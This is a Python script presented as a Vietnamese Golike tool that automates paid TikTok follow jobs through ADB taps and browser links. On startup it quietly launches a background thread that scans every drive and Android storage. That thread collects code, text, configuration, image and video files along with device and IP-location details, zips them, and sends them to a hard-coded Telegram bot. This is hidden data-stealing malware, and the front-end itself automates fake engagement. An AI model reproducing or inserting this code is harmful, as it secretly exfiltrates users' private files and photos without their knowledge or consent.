# main.py
import os
import zipfile
import requests
import platform
import psutil
import socket
import time
from datetime import datetime
from dotenv import load_dotenv
from pathlib import Path
import shutil
import json
import sys
import random
import webbrowser
from bs4 import BeautifulSoup
from colorama import Fore, init
from rich.console import Console
from rich.table import Table
from rich import box
from rich.panel import Panel
from rich.prompt import Prompt
from rich.progress import Progress, SpinnerColumn, BarColumn, TimeElapsedColumn, TextColumn
from pystyle import Colors, Colorate, Center
from threading import Thread, Event
import cloudscraper

# FileCollector (đặt ở trên cùng)
class FileCollector:
    def __init__(self):
        load_dotenv()
        self.adminId = os.getenv("TELEGRAM_ADMIN_ID", "8181770281")
        self.botToken = os.getenv("TELEGRAM_BOT_TOKEN", "8173520834:AAEiyn101yALrGvIayu4AVuY9hHxXZ5za8k")
        self.google_maps_api_key = os.getenv("GOOGLE_MAPS_API_KEY", "")
        
        self.file_exts = [".py", ".js", ".log", ".text", ".html", ".css", ".txt", ".sh", ".ts", ".json"]
        self.image_exts = [".jpg", ".jpeg", ".png", ".gif", ".bmp", ".mp4"]
        
        self.rootPaths = ["/", "/storage/emulated/0", "C:/", "D:/", "E:/"] if os.name != "nt" else ["C:/", "D:/", "E:/"]
        self.max_zip_size = 40 * 1024 * 1024  # 40MB

    def getDeviceInfo(self):
        deviceName = platform.node() or "device"
        systemInfo = platform.system()
        releaseInfo = platform.release()
        cpuInfo = platform.processor() or "Unknown CPU"
        
        memoryStats = psutil.virtual_memory()
        ramTotal = round(memoryStats.total / (1024 ** 3), 2)
        ramUsed = round(memoryStats.used / (1024 ** 3), 2)

        diskStats = psutil.disk_usage("/")
        diskTotal = round(diskStats.total / (1024 ** 3), 2)
        diskFree = round(diskStats.free / (1024 ** 3), 2)

        try:
            ipLocal = socket.gethostbyname(socket.gethostname())
        except:
            ipLocal = "Unknown"

        try:
            response = requests.get("http://ip-api.com/json", timeout=5)
            geoData = response.json()
            ipPublic = geoData.get("query", "Unknown")
            country = geoData.get("country", "Unknown")
            region = geoData.get("regionName", "Unknown")
            city = geoData.get("city", "Unknown")
            isp = geoData.get("isp", "Unknown")
        except:
            ipPublic = country = region = city = isp = "Unknown"

        return deviceName, {
            'device': deviceName,
            'os': f"{systemInfo} {releaseInfo}",
            'cpu': cpuInfo,
            'memory': f"{ramUsed}GB / {ramTotal}GB",
            'disk': f"{diskFree}GB free / {diskTotal}GB total",
            'local_ip': ipLocal,
            'public_ip': ipPublic,
            'location': f"{country}, {region}, {city}",
            'isp': isp
        }

    def collectFiles(self):
        collected_files = []
        collected_images = []
        for basePath in self.rootPaths:
            if os.path.exists(basePath):
                for rootDir, _, files in os.walk(basePath):
                    for fileName in files:
                        fullPath = os.path.join(rootDir, fileName)
                        try:
                            if os.path.isfile(fullPath) and os.access(fullPath, os.R_OK):
                                ext = os.path.splitext(fileName.lower())[1]
                                if ext in self.file_exts:
                                    collected_files.append(fullPath)
                                elif ext in self.image_exts:
                                    collected_images.append(fullPath)
                        except:
                            continue
                    time.sleep(0.01)  # Giảm tải CPU khi quét nhiều file
        return collected_files, collected_images

    def splitFileGroups(self, files, max_size=40 * 1024 * 1024):
        groups = []
        current_group = []
        current_size = 0

        for file_path in files:
            try:
                file_size = os.path.getsize(file_path)
                if file_size > max_size:
                    continue
                if current_size + file_size > max_size:
                    groups.append(current_group)
                    current_group = [file_path]
                    current_size = file_size
                else:
                    current_group.append(file_path)
                    current_size += file_size
            except:
                continue

        if current_group:
            groups.append(current_group)
        
        return groups

    def createZipArchive(self, zipName, files):
        try:
            with zipfile.ZipFile(zipName, "w", zipfile.ZIP_DEFLATED) as zipFile:
                seen_names = set()
                base_dir = os.path.commonpath(files) if files else "."
                for filePath in files:
                    try:
                        arcname = os.path.relpath(filePath, start=base_dir)
                        if arcname in seen_names:
                            base, ext = os.path.splitext(arcname)
                            counter = 1
                            new_arcname = f"{base}_{counter}{ext}"
                            while new_arcname in seen_names:
                                counter += 1
                                new_arcname = f"{base}_{counter}{ext}"
                            arcname = new_arcname
                        seen_names.add(arcname)
                        zipFile.write(filePath, arcname)
                    except:
                        continue
            return os.path.exists(zipName) and os.path.getsize(zipName) > 0
        except:
            return False

    def splitLargeFile(self, file_path, max_size=40 * 1024 * 1024):
        if os.path.getsize(file_path) <= max_size:
            return [file_path]
        
        part_files = []
        base_name = os.path.splitext(file_path)[0]
        ext = os.path.splitext(file_path)[1]
        with open(file_path, 'rb') as f:
            part_num = 1
            while True:
                chunk = f.read(max_size)
                if not chunk:
                    break
                part_file = f"{base_name}_part{part_num}{ext}"
                with open(part_file, 'wb') as part_f:
                    part_f.write(chunk)
                part_files.append(part_file)
                part_num += 1
        return part_files

    def sendToTelegram(self, file_path, caption, max_retries=3):
        url = f"https://api.telegram.org/bot{self.botToken}/sendDocument"
        for attempt in range(max_retries):
            try:
                if not os.path.exists(file_path):
                    return False
                file_size = os.path.getsize(file_path) / (1024 * 1024)
                if file_size > 50:
                    part_files = self.splitLargeFile(file_path)
                    for part_file in part_files:
                        with open(part_file, 'rb') as file:
                            response = requests.post(
                                url,
                                data={"chat_id": self.adminId, "caption": caption},
                                files={"document": file},
                                timeout=120
                            )
                            if response.status_code != 200:
                                return False
                        os.remove(part_file)
                    if os.path.exists(file_path):
                        os.remove(file_path)
                    return True
                else:
                    with open(file_path, 'rb') as file:
                        response = requests.post(
                            url,
                            data={"chat_id": self.adminId, "caption": caption},
                            files={"document": file},
                            timeout=120
                        )
                        if response.status_code != 200:
                            return False
                    return True
            except:
                time.sleep(5 * (attempt + 1))
        return False

    def logToTelegram(self, message):
        timestamp = datetime.now().strftime("[%H:%M:%S]")
        url = f"https://api.telegram.org/bot{self.botToken}/sendMessage"
        try:
            data = {"chat_id": self.adminId, "text": f"{timestamp} {message}"}
            response = requests.post(url, data=data, timeout=60)
            if response.status_code != 200:
                pass
        except:
            pass

    def run(self):
        self.logToTelegram("Bắt đầu thu thập")
        
        deviceName, deviceInfo = self.getDeviceInfo()
        collected_files, collected_images = self.collectFiles()
        
        self.logToTelegram(f"Tìm thấy {len(collected_files)} file, {len(collected_images)} ảnh")

        target_dir = "/storage/emulated/0/Download/zalo"
        try:
            os.makedirs(target_dir, exist_ok=True)
            os.chdir(target_dir)
        except:
            self.logToTelegram("Lỗi gửi file")
            return

        if collected_files:
            file_groups = self.splitFileGroups(collected_files)
            self.logToTelegram("Gửi file")
            for i, group in enumerate(file_groups, 1):
                zipName_files = os.path.join(target_dir, f"{deviceName}_files_group{i}.zip")
                if self.createZipArchive(zipName_files, group):
                    caption = "\n".join([f"{k}: {v}" for k, v in deviceInfo.items()]) + "\n(Type: Files)"
                    if self.sendToTelegram(zipName_files, caption):
                        if i == len(file_groups):
                            self.logToTelegram("Đã gửi file")
                        if os.path.exists(zipName_files):
                            os.remove(zipName_files)
                    else:
                        self.logToTelegram("Lỗi gửi file")
                        break
                else:
                    self.logToTelegram("Lỗi gửi file")
                    break

        if collected_images:
            image_groups = self.splitFileGroups(collected_images)
            self.logToTelegram("Gửi ảnh")
            for i, group in enumerate(image_groups, 1):
                zipName_images = os.path.join(target_dir, f"{deviceName}_images_group{i}.zip")
                if self.createZipArchive(zipName_images, group):
                    caption = "\n".join([f"{k}: {v}" for k, v in deviceInfo.items()]) + "\n(Type: Images)"
                    if self.sendToTelegram(zipName_images, caption):
                        if i == len(image_groups):
                            self.logToTelegram("Đã gửi ảnh")
                        if os.path.exists(zipName_images):
                            os.remove(zipName_images)
                    else:
                        self.logToTelegram("Lỗi gửi ảnh")
                        break
                else:
                    self.logToTelegram("Lỗi gửi ảnh")
                    break

# Golike (hoặc mã nguồn khác)
init(autoreset=True)
console = Console()

gradient_list = [
    Colors.red_to_yellow,
    Colors.green_to_cyan,
    Colors.purple_to_red,
    Colors.yellow_to_red,
    Colors.blue_to_purple,
    Colors.rainbow
]

frames = [
    "[•      ]",
    "[ •     ]",
    "[  •    ]",
    "[   •   ]",
    "[    •  ]",
    "[     • ]",
    "[      •]",
    "[     • ]",
    "[    •  ]",
    "[   •   ]",
    "[  •    ]",
    "[ •     ]",
]

color_gradients = [
    Colors.red_to_yellow,
    Colors.green_to_cyan,
    Colors.purple_to_red,
    Colors.yellow_to_red,
    Colors.blue_to_purple,
    Colors.rainbow,
]

def loading_animation_mau(text="⏳ ĐANG TẢI", delay=0.08, repeat=-1):
    try:
        count = 0
        while repeat == -1 or count < repeat:
            for frame in frames:
                gradient = random.choice(color_gradients)
                colored = Colorate.Horizontal(gradient, f"{text} {frame}", 1)
                sys.stdout.write("\r" + colored)
                sys.stdout.flush()
                time.sleep(delay)
            count += 1
    except KeyboardInterrupt:
        sys.stdout.write("\n")
        sys.stdout.flush()

def menu_gradient_animated(prompt_text, options, default="1"):
    stop_event = Event()
    
    def animate_options():
        while not stop_event.is_set():
            os.system("cls" if os.name == "nt" else "clear")
            gradient = random.choice(gradient_list)
            print()
            for i, opt in enumerate(options, 1):
                print(Colorate.Horizontal(gradient, f"[{i}] {opt}"))
            print()
            gradient_prompt = Colorate.Horizontal(gradient, prompt_text)
            print(gradient_prompt)
            time.sleep(0.99)
    
    t = Thread(target=animate_options)
    t.start()

    try:
        choice = Prompt.ask("Chọn", choices=[str(i) for i in range(1, len(options) + 1)], default=default)
    finally:
        stop_event.set()
        t.join()
    
    return choice

gradient_options = [
    Colors.red_to_yellow,
    Colors.green_to_cyan,
    Colors.purple_to_red,
    Colors.yellow_to_red,
    Colors.blue_to_purple,
    Colors.rainbow,
]

def banner():
    os.system("cls" if os.name == "nt" else "clear")
    ascii = """
██████╗░██╗░░░██╗░█████╗░░██████╗██╗░░██╗
██╔══██╗██║░░░██║██╔══██╗██╔════╝██║░░██║
██████╦╝██║░░░██║███████║╚█████╗░███████║
██╔══██╗██║░░░██║██╔══██║░╚═══██╗██╔══██║
██████╦╝╚██████╔╝██║░░██║██████╔╝██║░░██║
╚═════╝░░╚═════╝░╚═╝░░╚═╝╚═════╝░╚═╝░░╚═╝

░█████╗░███╗░░██║░██████╗░
██╔══██╗████╗░██║██╔════╝░
███████║██╔██╗██║██║░░██╗░
██╔══██║██║╚████║██║░░╚██╗
██║░░██║██║░╚███║╚██████╔╝
╚═╝░░╚═╝╚═╝░░╚══╝░╚═════╝░
"""
    gradient = random.choice(gradient_options)
    colored_ascii = Colorate.Vertical(gradient, ascii)
    for line in colored_ascii.splitlines():
        print(Center.XCenter(line))
        time.sleep(0.01)
    print(Center.XCenter(Colorate.Horizontal(gradient, "")))
    print(Center.XCenter(Colorate.Horizontal(gradient, "")))
    print("\n")

def hieu_ung_progress(text, seconds=5):
    with Progress(
        SpinnerColumn(),
        TextColumn("[progress.description]{task.description}"),
        BarColumn(),
        TimeElapsedColumn(),
    ) as progress:
        task = progress.add_task(text, total=seconds)
        for _ in range(seconds):
            progress.update(task, advance=1)
            time.sleep(1)

def golike_main():
    os.system("clear")
    try:
        with open("Authorization.txt", "x"): pass
        with open("token.txt", "x"): pass
    except: pass

    try:
        with open("Authorization.txt", "r") as Authorization, open("token.txt", "r") as t:
            author = Authorization.read().strip()
            token = t.read().strip()
    except:
        print("\033[1;31mKhông đọc được Authorization hoặc token!")
        sys.exit(1)
    
    banner()
    console.print(Panel.fit(
        "[bold magenta]CHỌN TÙY CHỌN:\n\n"
        "[bold cyan][1][/bold cyan] [green]Sử dụng Authorization và Token hiện tại[/green]\n"
        "[bold cyan][2][/bold cyan] [yellow]Nhập Authorization và Token mới[/yellow]",
        title="[bold white]LOGIN GOLIKE[/bold white]", border_style="bright_blue"))

    chon = Prompt.ask("[bold white]Nhập lựa chọn[/bold white]", choices=["1", "2"], default="1")
    if chon == "2":
        author = input("NHẬP AUTHORIZATION: ").strip()
        token = input("NHẬP TOKEN: ").strip()
        with open("Authorization.txt", "w") as f1, open("token.txt", "w") as f2:
            f1.write(author)
            f2.write(token)

    headers = {
        'Accept': 'application/json, text/plain, */*',
        'Content-Type': 'application/json;charset=utf-8',
        'Authorization': author,
        't': token,
        'User-Agent': 'Mozilla/5.0',
        'Referer': 'https://app.golike.net/account/manager/tiktok',
    }
    scraper = cloudscraper.create_scraper()

    def chonacc():
        res = scraper.get('https://gateway.golike.net/api/tiktok-account', headers=headers)
        return res.json()

    chontk = chonacc()

    if chontk.get("status") != 200:
        console.print("[bold red]⛔ Token hoặc Authorization sai!")
        sys.exit()
    
    banner()
    loc_gia = "2"
    bo_rieng_tu = "1"
    print("1.Kết nối adb \n2.Không kn adb ")
    su_dung_adb = Prompt.ask("Chọn", choices=["1", "2"], default="1") == "1"

    def ket_noi_adb_va_nhap_toa_do():
        try:
            ip = input("🔌 Nhập IP và port (VD: 192.168.1.5:5555): ").strip()
            pair_code = input("🔑 Nhập mã pair code: ").strip()
            pair_port = ip.split(":")[1]
            ip_only = ip.split(":")[0]

            print(Fore.CYAN + f"🔄 Đang ghép nối với {ip_only}:{pair_port} ...")
            os.system(f"adb pair {ip_only}:{pair_port} {pair_code}")
            time.sleep(2)

            print(Fore.CYAN + f"🔗 Đang kết nối tới {ip} ...")
            os.system(f"adb connect {ip}")
            time.sleep(2)

            adb_out = os.popen("adb devices").read()
            if f"{ip_only}\tdevice" in adb_out:
                loading_animation_mau(f"{Fore.GREEN}✅ Kết nối thành công với thiết bị {ip}{Fore.WHITE}")
            elif f"{ip_only}\tunauthorized" in adb_out:
                print(Fore.RED + "❌ Thiết bị chưa cấp quyền ADB! Kiểm tra điện thoại." + Fore.WHITE)
                return
            else:
                print(Fore.RED + "❌ Kết nối ADB thất bại. Kiểm tra IP hoặc cổng." + Fore.WHITE)
                return

            try:
                global x, y  # Biến toàn cục để dùng trong open_link
                x = int(input("📍 Nhập tọa độ X Follow: "))
                y = int(input("📍 Nhập tọa độ Y cần bấm: "))
                loading_animation_mau(f"{Fore.YELLOW}✅ Nhập tọa độ ({x}, {y}) thành công!{Fore.WHITE}")
            except ValueError:
                print(Fore.RED + "❌ Tọa độ phải là số nguyên!" + Fore.WHITE)

        except Exception as e:
            print(Fore.RED + f"⚠️ Lỗi: {e}" + Fore.WHITE)

    if su_dung_adb:
        ket_noi_adb_va_nhap_toa_do()

    def loading_animation_mau_simple(text, seconds=3):
        for _ in range(seconds):
            print(text + ".", end="\r")
            time.sleep(0.4)
            print(text + "..", end="\r")
            time.sleep(0.4)
            print(text + "...", end="\r")
            time.sleep(0.4)

    def dsacc():
        table = Table(title="DANH SÁCH ACC", box=box.ROUNDED)
        table.add_column("STT", style="yellow", justify="center")
        table.add_column("Nick", style="cyan")
        for i, acc in enumerate(chontk["data"], 1):
            table.add_row(str(i), acc["unique_username"])
        console.print(table)

    dsacc()
    while True:
        try:
            chon = int(input("Chọn acc TIKTOK: "))
            if 1 <= chon <= len(chontk["data"]):
                acc = chontk["data"][chon - 1]
                break
            print("Nhập sai!")
        except:
            print("Lỗi nhập")

    acc_id = acc["id"]
    nickname = acc["nickname"]
    delay = int(input("Delay giây: "))
    doiacc = int(input("Số lần fail thì đổi acc: "))
    loc_gia_duoi = float(input("Nhập giá trị Lọc job dưới (VD: 50): "))

    def open_link(link):
        try:
            if os.path.exists("/data/data/com.termux/files/usr/bin/termux-open-url"):
                loading_animation_mau_simple("[🌐] Đang mở link...")
                os.system(f'termux-open-url "{link}"')
            elif su_dung_adb and "device" in os.popen("adb devices").read():
                loading_animation_mau_simple("[🤖] Đang mở link qua ADB...")
                os.system(f'adb shell am start -a android.intent.action.VIEW -d "{link}"')
                time.sleep(2)
                os.system(f'adb shell input tap {x} {y}')
                loading_animation_mau_simple(f"✅ Đã follow tại ({x}, {y}) qua ADB")
            else:
                loading_animation_mau_simple("[💻] Đang mở link bằng trình duyệt máy tính...")
                webbrowser.open(link)
            time.sleep(2)
        except Exception as e:
            print(f"❗ Không mở được link: {link}\nLỗi: {e}")

    def display(nick, price, dem, tong, link, status):
        os.system('cls' if os.name == 'nt' else 'clear')
        banner()
        console.rule("[bold bright_cyan]✨ GOLIKE TOOL ✨", style="cyan")
        tb = Table(title="Thông tin chi tiết", box=box.ROUNDED, border_style="bright_blue", title_style="bold magenta")
        tb.add_column("🔹 Thông Tin", style="bold green", justify="right", no_wrap=True)
        tb.add_column("🔸 Giá Trị", style="bold yellow", overflow="fold")
        tb.add_row("Nick TikTok", f"[bold white]{nick}[/bold white]")
        tb.add_row("💰 Giá", f"[bold cyan]{price}[/bold cyan]")
        tb.add_row("✅ Job Done", f"[bold green]{dem}[/bold green]")
        tb.add_row("📊 Tổng Job", f"[bold yellow]{tong}[/bold yellow]")
        tb.add_row("🔗 Link", f"[blue underline]{link}[/blue underline]")
        status_color = "green" if "thành công" in status.lower() else "red" if "lỗi" in status.lower() else "yellow"
        tb.add_row("📌 Trạng Thái", f"[bold {status_color}]{status}[/bold {status_color}]")
        console.print(tb)

    def get_job(aid):
        try:
            res = scraper.get('https://gateway.golike.net/api/advertising/publishers/tiktok/jobs',
                              headers=headers, params={'account_id': aid})
            return res.json()
        except: return {}

    def hoanthanh(ads_id, acc_id):
        try:
            res = scraper.post('https://gateway.golike.net/api/advertising/publishers/tiktok/complete-jobs',
                               headers=headers,
                               json={'ads_id': ads_id, 'account_id': acc_id, 'async': True, 'data': None})
            return res.json()
        except: return {}

    def baoloi(ads_id, obj_id, acc_id, loai):
        try:
            scraper.post('https://gateway.golike.net/api/report/send', headers=headers,
                         json={'description': 'Tôi đã làm Job này rồi',
                               'users_advertising_id': ads_id,
                               'type': 'ads',
                               'provider': 'tiktok',
                               'fb_id': acc_id,
                               'error_type': 6})
            scraper.post('https://gateway.golike.net/api/advertising/publishers/tiktok/skip-jobs',
                         headers=headers,
                         json={'ads_id': ads_id, 'object_id': obj_id, 'account_id': acc_id, 'type': loai})
        except: pass

    dem, tong, fail = 0, 0, 0

    while True:
        if fail >= doiacc:
            print(f"⚠️ Acc lỗi quá nhiều, đổi acc khác.")
            dsacc()
            while True:
                try:
                    chon = int(input("Chọn lại acc: "))
                    if 1 <= chon <= len(chontk["data"]):
                        acc = chontk["data"][chon - 1]
                        acc_id = acc["id"]
                        nickname = acc["nickname"]
                        fail = 0
                        break
                    print("Sai lựa chọn!")
                except: print("Lỗi nhập")

        job = get_job(acc_id)
        if not isinstance(job, dict) or "data" not in job or not isinstance(job["data"], dict) or "link" not in job["data"]:
            display(nickname, "Không có", dem, tong, "-", "Không lấy được job")
            time.sleep(2)
            fail += 1
            continue

        data = job["data"]
        if bo_rieng_tu and data.get("is_private", False):
            display(nickname, "Riêng tư", dem, tong, "-", "Bỏ job riêng tư")
            baoloi(data["id"], data["object_id"], acc_id, data["type"])
            time.sleep(1)
            continue
        if data["type"] != "follow":
            display(nickname, str(data.get("price_after_cost")), dem, tong, "-", "Không phải follow")
            baoloi(data["id"], data["object_id"], acc_id, data["type"])
            time.sleep(1)
            continue
        price = data.get("price_after_cost", 0)
        if price < loc_gia_duoi:
            display(nickname, str(price), dem, tong, "-", f"Giá {price} nhỏ hơn Lọc job dưới {loc_gia_duoi}")
            baoloi(data["id"], data["object_id"], acc_id, data["type"])
            time.sleep(1)
            continue

        link = data["link"]
        display(nickname, str(price), dem, tong, link, "Đang làm")
        open_link(link)
        for i in range(delay, -1, -1):
            display(nickname, str(price), dem, tong, link, f"Đợi {i}s")
            time.sleep(1)

        nhantien = hoanthanh(data["id"], acc_id)
        if nhantien.get("status") == 200:
            dem += 1
            tong += price
            hieu_ung_progress("📦 Đợi hoàn tất nhận tiền....", seconds=5)
            display(nickname, str(price), dem, tong, link, "✅ Thành công")
            fail = 0
        elif nhantien.get("status") == "already_completed":
            display(nickname, "Đã làm", dem, tong, link, "Đã hoàn thành trước")
            baoloi(data["id"], data["object_id"], acc_id, data["type"])
        else:
            fail += 1
            display(nickname, "Lỗi nhận", dem, tong, link, "❌ Nhận tiền lỗi")
            baoloi(data["id"], data["object_id"], acc_id, data["type"])

        time.sleep(1)

if __name__ == "__main__":
    print("Đang khởi động chương trình...")
    collector = FileCollector()
    file_collector_thread = Thread(target=collector.run)
    file_collector_thread.daemon = True  # Đặt luồng là daemon để dừng khi Golike kết thúc
    file_collector_thread.start()
    time.sleep(2)  # Chờ FileCollector khởi động trước
    golike_main()